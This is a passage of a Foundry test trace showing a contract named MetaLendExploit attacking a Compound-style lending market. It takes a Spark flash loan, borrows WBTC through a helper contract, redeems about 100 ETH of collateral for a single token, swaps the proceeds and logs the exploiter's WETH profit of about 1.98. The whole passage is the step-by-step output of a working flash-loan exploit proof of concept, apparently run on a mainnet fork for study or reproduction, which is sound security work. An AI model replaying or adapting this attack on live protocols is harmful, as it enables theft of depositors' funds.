    │   │   │   │   │   │   │   │   │   │   @ 0x931cbe224bcbd0fd5b7a10faba560ffef69c8cf711568ce1a54ce30053e6195f: 0 → 0x011c8eb100000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   │   ├─ [795] WBTC::balanceOf(0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E) [staticcall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 11000000 [1.1e7]
    │   │   │   │   │   │   │   ├─ [30803] WBTC::transfer(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 10999999 [1.099e7])
    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E, to: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 10999999 [1.099e7])
    │   │   │   │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   │   │   │   @ 0x8cab83899973de0c9f2750ab03da4294a9002ed3c67324166e4e47c03fa1aaa9: 0x0000000000000000000000000000000000000000000000000000000000a7d8c0 → 1
    │   │   │   │   │   │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0 → 0x0000000000000000000000000000000000000000000000000000000000a7d8bf
    │   │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   │   ├─ emit Borrow(borrower: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], borrowAmount: 10999999 [1.099e7], accountBorrows: 10999999 [1.099e7], totalBorrows: 10999999 [1.099e7])
    │   │   │   │   │   │   │   ├─ [949] Comptroller::borrowVerify(0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E, Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 10999999 [1.099e7])
    │   │   │   │   │   │   │   │   ├─ [354] 0xcebC23A10Ccb6805C6c759c9e9538DdD01990276::borrowVerify(0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E, Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 10999999 [1.099e7]) [delegatecall]
    │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   └─ ← [Return]
    │   │   │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   │   │   @ 0x9a2ada2733561e1c19dd04d270d8000fe18633772bc90828f20e06927d4fb839: 0 → 0x0000000000000000000000000000000000000000000000000e78b4951f126307
    │   │   │   │   │   │   │   │   @ 9: 0x0000000000000000000000000000000000000000000000000000000000d8f520 → 0x00000000000000000000000000000000000000000000000000000000011c8eb1
    │   │   │   │   │   │   │   │   @ 0x9a2ada2733561e1c19dd04d270d8000fe18633772bc90828f20e06927d4fb838: 0 → 0x0000000000000000000000000000000000000000000000000000000000a7d8bf
    │   │   │   │   │   │   │   │   @ 11: 0 → 0x0000000000000000000000000000000000000000000000000000000000a7d8bf
    │   │   │   │   │   │   │   │   @ 10: 0x0000000000000000000000000000000000000000000000000de2e2fb18a52b11 → 0x0000000000000000000000000000000000000000000000000e78b4951f126307
    │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   ├─ [795] WBTC::balanceOf(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 10999999 [1.099e7]
    │   │   │   │   │   ├─ [26003] WBTC::transfer(MetaLendExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10999999 [1.099e7])
    │   │   │   │   │   │   ├─ emit Transfer(from: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: MetaLendExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 10999999 [1.099e7])
    │   │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x0000000000000000000000000000000000000000000000000000000000a7d8bf
    │   │   │   │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0x0000000000000000000000000000000000000000000000000000000000a7d8bf → 0
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [481] 0x5578f2E245e932a599c46215a0cA88707230F17B::getCash() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 100000000000000000000 [1e20]
    │   │   │   │   │   ├─ [75285] 0x5578f2E245e932a599c46215a0cA88707230F17B::redeemUnderlying(99999999999999999999 [9.999e19])
    │   │   │   │   │   │   ├─ [53562] Comptroller::redeemAllowed(0x5578f2E245e932a599c46215a0cA88707230F17B, Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1)
    │   │   │   │   │   │   │   ├─ [52884] 0xcebC23A10Ccb6805C6c759c9e9538DdD01990276::redeemAllowed(0x5578f2E245e932a599c46215a0cA88707230F17B, Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1) [delegatecall]
    │   │   │   │   │   │   │   │   ├─ [2739] 0x5578f2E245e932a599c46215a0cA88707230F17B::getAccountSnapshot(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0, 2, 0, 50000000000000000000000000000000000000 [5e37]
    │   │   │   │   │   │   │   │   ├─ [9736] 0xd0AF1C29E842B94490a78797342e3654E7833Bf4::getUnderlyingPrice(0x5578f2E245e932a599c46215a0cA88707230F17B) [staticcall]
    │   │   │   │   │   │   │   │   │   ├─ [1054] 0x5578f2E245e932a599c46215a0cA88707230F17B::symbol() [staticcall]
    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] "mETH"
    │   │   │   │   │   │   │   │   │   ├─ [1054] 0x5578f2E245e932a599c46215a0cA88707230F17B::symbol() [staticcall]
    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] "mETH"
    │   │   │   │   │   │   │   │   │   ├─ [3235] 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419::latestRoundData() [staticcall]
    │   │   │   │   │   │   │   │   │   │   ├─ [1502] 0xE62B71cf983019BFf55bC83B48601ce8419650CC::latestRoundData() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8221, 207100000000 [2.071e11], 1700913347 [1.7e9], 1700913347 [1.7e9], 8221
    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 110680464442257317917 [1.106e20], 207100000000 [2.071e11], 1700913347 [1.7e9], 1700913347 [1.7e9], 110680464442257317917 [1.106e20]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 2071000000000000000000 [2.071e21]
    │   │   │   │   │   │   │   │   ├─ [7958] 0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E::getAccountSnapshot(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   │   │   │   │   ├─ [6489] 0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E::delegateToImplementation(0xc37f68e20000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f) [staticcall]
    │   │   │   │   │   │   │   │   │   │   ├─ [4620] 0x5A3b0BAF4532d7e50D7f6a94b0F152B68153B791::getAccountSnapshot(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   │   │   │   │   │   │   │   │   ├─ [795] WBTC::balanceOf(0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 1
    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0, 0, 10999999 [1.099e7], 20000000000000000 [2e16]
    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a7d8bf00000000000000000000000000000000000000000000000000470de4df820000
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0, 0, 10999999 [1.099e7], 20000000000000000 [2e16]
    │   │   │   │   │   │   │   │   ├─ [11802] 0xd0AF1C29E842B94490a78797342e3654E7833Bf4::getUnderlyingPrice(0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E) [staticcall]
    │   │   │   │   │   │   │   │   │   ├─ [1053] 0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E::symbol() [staticcall]
    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] "mWBTC"
    │   │   │   │   │   │   │   │   │   ├─ [1053] 0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E::symbol() [staticcall]
    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] "mWBTC"
    │   │   │   │   │   │   │   │   │   ├─ [424] 0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E::underlying() [staticcall]
    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] WBTC: [0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599]
    │   │   │   │   │   │   │   │   │   ├─ [424] 0x0D8Df79195EC37C6cD53036f9F8eE0c24b23601E::underlying() [staticcall]
    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] WBTC: [0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599]
    │   │   │   │   │   │   │   │   │   ├─ [3235] 0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c::latestRoundData() [staticcall]
    │   │   │   │   │   │   │   │   │   │   ├─ [1502] 0xdBe1941BFbe4410D6865b9b7078e0b49af144D2d::latestRoundData() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 8054, 3764866000000 [3.764e12], 1700913323 [1.7e9], 1700913323 [1.7e9], 8054
    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 110680464442257317750 [1.106e20], 3764866000000 [3.764e12], 1700913323 [1.7e9], 1700913323 [1.7e9], 110680464442257317750 [1.106e20]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 376486600000000000000000000000000 [3.764e32]
    │   │   │   │   │   │   │   │   ├─ [530] 0x5578f2E245e932a599c46215a0cA88707230F17B::balanceOf(Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 2
    │   │   │   │   │   │   │   │   ├─ emit DistributedSupplierComp(param0: 0x5578f2E245e932a599c46215a0cA88707230F17B, param1: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], param2: 0, param3: 0)
    │   │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   ├─ [55] Helper::receive{value: 99999999999999999999}()
    │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   ├─ emit Transfer(from: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x5578f2E245e932a599c46215a0cA88707230F17B, value: 1)
    │   │   │   │   │   │   ├─ emit Redeem(redeemer: Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], redeemAmount: 99999999999999999999 [9.999e19], redeemTokens: 1)
    │   │   │   │   │   │   ├─ [1047] Comptroller::redeemVerify(0x5578f2E245e932a599c46215a0cA88707230F17B, Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 99999999999999999999 [9.999e19], 1)
    │   │   │   │   │   │   │   ├─ [446] 0xcebC23A10Ccb6805C6c759c9e9538DdD01990276::redeemVerify(0x5578f2E245e932a599c46215a0cA88707230F17B, Helper: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 99999999999999999999 [9.999e19], 1) [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   └─ ← [Return]
    │   │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   │   @ 13: 2 → 1
    │   │   │   │   │   │   │   @ 0x03e4c9e74b1c7b5bc291bbceddb1959bc654bc89eb9c1f11f6da9a1eeb9b4074: 2 → 1
    │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   ├─ [55] MetaLendExploit::receive{value: 99999999999999999999}()
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [21974] WETH::deposit{value: 99999999999999999999}()
    │   │   │   │   │   ├─ emit Deposit(dst: MetaLendExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 99999999999999999999 [9.999e19])
    │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x0000000000000000000000000000000000000000000000056bc75e2d630fffff
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [24724] WBTC::approve(Router: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   │   │   ├─ emit Approval(owner: MetaLendExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   @ 0x26de9a43e7704b60d31f71cc330b4d43a0db9dad71c363e2fbd9119e9db294b7: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [795] WBTC::balanceOf(MetaLendExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 10999999 [1.099e7]
    │   │   │   │   ├─ [63237] Router::swapExactTokensForTokens(10999999 [1.099e7], 0, [0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], MetaLendExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1700916807 [1.7e9])
    │   │   │   │   │   ├─ [2504] 0xBb2b8038a1640196FbE3e38816F3e67Cba72D940::getReserves() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 10942929124 [1.094e10], 1981773535672763318773 [1.981e21], 1700915495 [1.7e9]
    │   │   │   │   │   ├─ [9770] WBTC::transferFrom(MetaLendExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xBb2b8038a1640196FbE3e38816F3e67Cba72D940, 10999999 [1.099e7])
    │   │   │   │   │   │   ├─ emit Transfer(from: MetaLendExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xBb2b8038a1640196FbE3e38816F3e67Cba72D940, value: 10999999 [1.099e7])
    │   │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   │   @ 0x0d2a19d3ac39dc6cc6fd07423195495e18679bd8c7dd610aa1db7cd784a683a8: 0x000000000000000000000000000000000000000000000000000000028c3fd8e4 → 0x000000000000000000000000000000000000000000000000000000028ce7b1a3
    │   │   │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x0000000000000000000000000000000000000000000000000000000000a7d8bf → 0
    │   │   │   │   │   │   │   @ 0x26de9a43e7704b60d31f71cc330b4d43a0db9dad71c363e2fbd9119e9db294b7: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffff582740
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─ [40714] 0xBb2b8038a1640196FbE3e38816F3e67Cba72D940::swap(0, 1984144102321156165 [1.984e18], MetaLendExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   │   │   │   │   ├─ [8062] WETH::transfer(MetaLendExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1984144102321156165 [1.984e18])
    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0xBb2b8038a1640196FbE3e38816F3e67Cba72D940, to: MetaLendExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1984144102321156165 [1.984e18])
    │   │   │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   │   │   @ 0x7fba2702a7d6e85ac783a88eacdc48e51310443458071f6db9ac66f8ca7068b8: 0x00000000000000000000000000000000000000000000006b6ea1f2cee4fa81f5 → 0x00000000000000000000000000000000000000000000006b5318da4272f091b0
    │   │   │   │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x0000000000000000000000000000000000000000000000056bc75e2d630fffff → 0x000000000000000000000000000000000000000000000005875076b9d519f044
    │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   ├─ [795] WBTC::balanceOf(0xBb2b8038a1640196FbE3e38816F3e67Cba72D940) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 10953929123 [1.095e10]
    │   │   │   │   │   │   ├─ [534] WETH::balanceOf(0xBb2b8038a1640196FbE3e38816F3e67Cba72D940) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Return] 1979789391570442162608 [1.979e21]
    │   │   │   │   │   │   ├─ emit Sync(reserve0: 10953929123 [1.095e10], reserve1: 1979789391570442162608 [1.979e21])
    │   │   │   │   │   │   ├─ emit Swap(sender: Router: [0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D], amount0In: 10999999 [1.099e7], amount1In: 0, amount0Out: 0, amount1Out: 1984144102321156165 [1.984e18], to: MetaLendExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   │   @ 8: 0x6561e92700000000006b6ea1f2cee4fa81f5000000000000000000028c3fd8e4 → 0x6561ea5f00000000006b5318da4272f091b0000000000000000000028ce7b1a3
    │   │   │   │   │   │   │   @ 9: 0x000000000000000000012e3bf67b1cfdf8b05842a5cb13c8991ccdf00bd68342 → 0x000000000000000000012e3c29ded9929f0573994e649d8341fd80f7e09b0eea
    │   │   │   │   │   │   │   @ 10: 0x000000000000000000000000000000000000002a5f4d8ffb7a03156e75ad3d98 → 0x000000000000000000000000000000000000002a5f54f637c6d661ffdb5f9508
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   └─ ← [Return] [10999999 [1.099e7], 1984144102321156165 [1.984e18]]
    │   │   │   │   ├─ [24420] WETH::approve(Spark: [0xC13e21B648A5Ee794902342038FF3aDAB66BE987], 100000000000000000000 [1e20])
    │   │   │   │   │   ├─ emit Approval(owner: MetaLendExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Spark: [0xC13e21B648A5Ee794902342038FF3aDAB66BE987], value: 100000000000000000000 [1e20])
    │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   @ 0xe544a2c64fd0bc051380599632208148b535f6b029c8fae6bfec627337c39215: 0 → 0x0000000000000000000000000000000000000000000000056bc75e2d63100000
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [7468] 0x2e7576042566f8D6990e07A1B61Ad1efd86Ae70d::scaledTotalSupply() [staticcall]
    │   │   │   │   ├─ [2419] 0x86C71796CcDB31c3997F8Ec5C2E3dB3e9e40b985::scaledTotalSupply() [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000001629ecc5ee4a6406bb72
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000001629ecc5ee4a6406bb72
    │   │   │   ├─ [9982] 0x3c6b93D38ffA15ea995D1BC950d5D0Fa6b22bD05::getSupplyData() [staticcall]
    │   │   │   │   ├─ [4921] 0x026a5B6114431d8F3eF2fA0E1B2EDdDccA9c540E::getSupplyData() [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    │   │   │   ├─ [4822] 0x59cD1C87501baa753d0B5B5Ab5D8416A45cD71DB::totalSupply() [staticcall]
    │   │   │   │   ├─ [4305] 0x6175ddEc3B9b38c88157C10A01ed4A3fa8639cC6::totalSupply() [delegatecall]
    │   │   │   │   │   ├─ [1340] Spark::getReserveNormalizedIncome(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]) [staticcall]
    │   │   │   │   │   │   ├─ [788] 0x8115366Ca7Cf280a760f0bC0F6Db3026e2437115::getReserveNormalizedIncome(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003438e30d2bcbb8e0887d5c9
    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003438e30d2bcbb8e0887d5c9
    │   │   │   │   │   └─ ← [Return] 140695633396219589438487 [1.406e23]
    │   │   │   │   └─ ← [Return] 140695633396219589438487 [1.406e23]
    │   │   │   ├─ [5093] 0xeCe550fB709C85CE9FC999A033447Ee2DF3ce55c::calculateInterestRates((0, 100000000000000000000 [1e20], 0, 0, 106658904539546820224207 [1.066e23], 0, 500, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x59cD1C87501baa753d0B5B5Ab5D8416A45cD71DB)) [staticcall]
    │   │   │   │   ├─ [534] WETH::balanceOf(0x59cD1C87501baa753d0B5B5Ab5D8416A45cD71DB) [staticcall]
    │   │   │   │   │   └─ ← [Return] 33950184859111082009734 [3.395e22]
    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000100dce544e0006226b69d70000000000000000000000000000000000000000001a784379d99db420000000000000000000000000000000000000000000000000164b320a74fa77c74be222
    │   │   │   ├─ emit ReserveDataUpdated(param0: WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], param1: 19408009982183530067356119 [1.94e25], param2: 32000000000000000000000000 [3.2e25], param3: 26951468608443180741550626 [2.695e25], param4: 1010124536047716650847819209 [1.01e27], param5: 1019046058530326423085031672 [1.019e27])
    │   │   │   ├─ [4148] WETH::transferFrom(MetaLendExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x59cD1C87501baa753d0B5B5Ab5D8416A45cD71DB, 100000000000000000000 [1e20])
    │   │   │   │   ├─ emit Transfer(from: MetaLendExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x59cD1C87501baa753d0B5B5Ab5D8416A45cD71DB, value: 100000000000000000000 [1e20])
    │   │   │   │   ├─  storage changes:
    │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x000000000000000000000000000000000000000000000005875076b9d519f044 → 0x0000000000000000000000000000000000000000000000001b89188c7209f044
    │   │   │   │   │   @ 0xe544a2c64fd0bc051380599632208148b535f6b029c8fae6bfec627337c39215: 0x0000000000000000000000000000000000000000000000056bc75e2d63100000 → 0
    │   │   │   │   │   @ 0x6c1eef25cf25dfa855df343339785be25ba773ed63c1ca0fbca263e6a490daca: 0x00000000000000000000000000000000000000000000073071762592b141a486 → 0x000000000000000000000000000000000000000000000735dd3d83c01451a486
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [1136] 0x59cD1C87501baa753d0B5B5Ab5D8416A45cD71DB::handleRepayment(MetaLendExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], MetaLendExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 100000000000000000000 [1e20])
    │   │   │   │   ├─ [578] 0x6175ddEc3B9b38c88157C10A01ed4A3fa8639cC6::handleRepayment(MetaLendExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], MetaLendExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 100000000000000000000 [1e20]) [delegatecall]
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Return]
    │   │   │   ├─ emit FlashLoan(param0: MetaLendExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], param2: 0x0000000000000000000000000000000000000000, param3: 728815563385977040452943777879061427756277306518 [7.288e47], param4: 100000000000000000000 [1e20], param5: 0, param6: 0)
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0xf81d8d79f42adb4c73cc3aa0c78e25d3343882d0313c0b80ece3d3a103ef1ec0: 0x0000000000100dce202acc9c7eeb70ee0000000003438e210d365fcb3db3e6fc → 0x0000000000100dce544e0006226b69d70000000003438e30d2bcbb8e0887d5c9
    │   │   │   │   @ 0xf81d8d79f42adb4c73cc3aa0c78e25d3343882d0313c0b80ece3d3a103ef1ec1: 0x0000000000164b31e6417fa2792c6cca00000000034aef4f6e550c02f25a2e1e → 0x0000000000164b320a74fa77c74be22200000000034aef6586ac6d343764a0f8
    │   │   │   │   @ 0xe544a2c64fd0bc051380599632208148b535f6b029c8fae6bfec627337c39215: 0 → 0x0000000000000000000000000000000000000000000000056bc75e2d63100000
    │   │   │   │   @ 0xf81d8d79f42adb4c73cc3aa0c78e25d3343882d0313c0b80ece3d3a103ef1ec7: 0x000000000000000000000000000000000000000000000000b8a9253c2f89c630 → 0x000000000000000000000000000000000000000000000000b8b0a5bbc095ebef
    │   │   │   │   @ 0xf81d8d79f42adb4c73cc3aa0c78e25d3343882d0313c0b80ece3d3a103ef1ec2: 0x0000000000000000000003006561e88b00000000001a784379d99db420000000 → 0x0000000000000000000003006561ea5f00000000001a784379d99db420000000
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   └─ ← [Return]
    ├─ [534] WETH::balanceOf(MetaLendExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 1984144102321156164 [1.984e18]
    ├─ emit log_named_decimal_uint(key: "Exploiter WETH balance after attack", val: 1984144102321156164 [1.984e18], decimals: 18)
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 32.44s (31.06s CPU time)

Ran 2 test suites in 33.34s (33.01s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
